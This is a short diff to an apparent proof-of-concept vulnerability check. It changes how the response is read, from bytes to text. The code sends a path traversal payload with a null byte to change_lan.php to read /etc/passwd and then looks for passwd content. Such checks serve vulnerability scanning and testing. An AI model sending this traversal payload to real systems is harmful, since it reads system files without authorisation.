@@ -50,7 +50,7 @@ class Poc(ABPoc):
             verify_url = self.target + \
                 '/change_lan.php?LanID=../../../../../../../../../etc/passwd%00'
             req = requests.get(verify_url)
-            content = req.content
+            content = req.text
 
             if ':/bin/' in content and 'Event.observe(window' in content and 'nobody:' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
